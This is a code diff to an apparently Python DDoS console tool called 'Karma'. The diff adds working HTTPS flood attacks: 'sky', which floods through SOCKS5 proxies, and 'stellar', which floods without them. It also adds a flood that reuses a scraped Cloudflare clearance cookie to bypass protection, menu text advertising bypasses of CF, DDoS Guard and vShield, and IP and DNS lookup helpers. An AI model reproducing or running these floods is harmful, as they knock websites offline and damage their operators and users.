@@ -1,12 +1,16 @@
 # -*- coding: utf-8 -*-
 from os import system, name
 import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
+from aiohttp import request
 from urllib.parse import urlparse
 from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
 from sys import stdout
+import sys
 from colorama import Fore, init
 init(convert=True)
+
+prox = open("bots.txt").readlines()
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -270,6 +274,9 @@ def AttackPXCFB(url, until_datetime, scraper):
             scraper.get(url, proxies=proxy)
         except:
             pass
+
+
+
 #endregion
 
 #region CFPRO
@@ -288,6 +295,38 @@ headers = {
         'Sec-Fetch-User': '?1',
         'TE': 'trailers',
 }
+
+def LaunchUAM(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    threads_count = 0
+    session = requests.Session()
+    scraper = cloudscraper.create_scraper(sess=session)
+    f = open('./solver/cookie.txt', 'r')
+    line = f.readlines()
+    cle = line[2].replace(" ", "").replace("'", "").replace("\n", "").replace(";", "").replace("cf_clearance=", "")
+    jar = RequestsCookieJar()
+    cook = [{
+        'name': 'cf_clearance',
+        'value': cle
+    }]
+    for cookie in cook:
+        jar.set(cookie['name'], cookie['value'])
+        scraper.cookies = jar
+    while threads_count <= int(th):
+        try:
+            thd = threading.Thread(target=AttackUAM, args=(url, until, scraper))
+            thd.start()
+            threads_count += 1
+        except:
+            pass
+
+def AttackUAM(url, until_datetime, scraper):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+        except:
+            pass
 
 def getcookie(url):
     global cookies
@@ -447,6 +486,113 @@ def AttackCFSOC(until_datetime, target, req):
 
 #endregion
 
+def attackSKY(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=LaunchSKY, args=(url, timer)).start()
+
+def LaunchSKY(url, timer):
+    proxy = random.choice(prox).strip().split(":")
+    timelol = time.time() + int(timer)
+    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "Cache-Control: no-cache\r\n"
+    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
+    req += "Sec-Fetch-Mode: navigate\r\n"
+    req += "Sec-Fetch-Dest: document\r\n"
+    req += "Upgrade-Insecure-Requests: 1\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
+        try:
+            s = socks.socksocket()
+            s.connect((str(urlparse(url).netloc), int(443)))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for i in range(80000):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
+
+def attackSTELLAR(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()
+
+def LaunchSTELLAR(url, timer):
+    timelol = time.time() + int(timer)
+    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "Cache-Control: no-cache\r\n"
+    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
+    req += "Sec-Fetch-Mode: navigate\r\n"
+    req += "Sec-Fetch-Dest: document\r\n"
+    req += "Upgrade-Insecure-Requests: 1\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(urlparse(url).netloc), int(443)))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for i in range(80000):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
+
+
 def clear(): 
     if name == 'nt': 
         _ = system('cls') 
@@ -454,11 +600,11 @@ def clear():
         _ = system('clear') 
 
 def title():
-    #stdout.write("\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mDiscord: \x1b[38;2;0;255;58m승혁#8271 \x1b[38;2;0;255;255m] \n")
+    sys.stdout.write("\x1b]2;Karma | User: root\x07")
     stdout.write("                                                                                          \n")
-    stdout.write("                                "+Fore.LIGHTMAGENTA_EX+"╦╔═╔═╗╦═╗╔╦╗╔═╗                 \n")
-    stdout.write("                                "+Fore.LIGHTRED_EX    +"╠╩╗╠═╣╠╦╝║║║╠═╣                 \n")
-    stdout.write("                                "+Fore.RED            +"╩ ╩╩ ╩╩╚═╩ ╩╩ ╩                \n")
+    stdout.write("                                 "+Fore.LIGHTMAGENTA_EX+"╦╔═╔═╗╦═╗╔╦╗╔═╗                 \n")
+    stdout.write("                                 "+Fore.LIGHTRED_EX    +"╠╩╗╠═╣╠╦╝║║║╠═╣                 \n")
+    stdout.write("                                 "+Fore.RED            +"╩ ╩╩ ╩╩╚═╩ ╩╩ ╩                \n")
     stdout.write("             "+Fore.RED            +"        ══╦═════════════════════════════════╦══\n")
     stdout.write("             \x1b[38;2;255;0;0m╔═════════╩═════════════════════════════════╩═════════╗\n")
     stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m        Welcome To The Main Screen Of Karma\x1b[38;2;255;0;0m         ║\n")
@@ -603,6 +749,55 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
+    elif command == "sky":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
+        target = input()
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
+        thread = input()
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
+        t = input()
+        threading.Thread(target=attackSKY, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    elif command == "stellar":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
+        target = input()
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
+        thread = input()
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
+        t = input()
+        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    elif command == "dnslookup":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"DOMAIN     : "+Fore.LIGHTGREEN_EX)
+        target = input()
+        try:
+            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
+            print(r.text)
+        except:
+            print('An error has occurred while sending the request to the API!')
+    
+    elif command == "reversedns":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN  : "+Fore.LIGHTGREEN_EX)
+        target = input()
+        try:
+            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
+            print(r.text)
+        except:
+            print('An error has occurred while sending the request to the API!')
+
+    elif command == "geoip":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP         : "+Fore.LIGHTGREEN_EX)
+        target = input()
+        try:
+            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
+            print(r.text)
+        except:
+            print('An error has occurred while sending the request to the API!')
+
     else:
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. 'help' or '?' to see all commands.\n")
         #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"Unknown command. 'help' or '?' to see all commands.\n")
@@ -613,6 +808,8 @@ def func():
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"sky        "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS Sky method without proxies\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head request attack\n")
@@ -623,6 +820,11 @@ def func():
     #stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
     #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
     #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
+
+    stdout.write(Fore.RED+" \n["+Fore.WHITE+"TOOLS"+Fore.RED+"]\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dnslookup  "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"reversedns "+Fore.RED+": "+Fore.WHITE+"Reverse DNS Lookup\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
     
     stdout.write(Fore.RED+" \n["+Fore.WHITE+"ETC.."+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
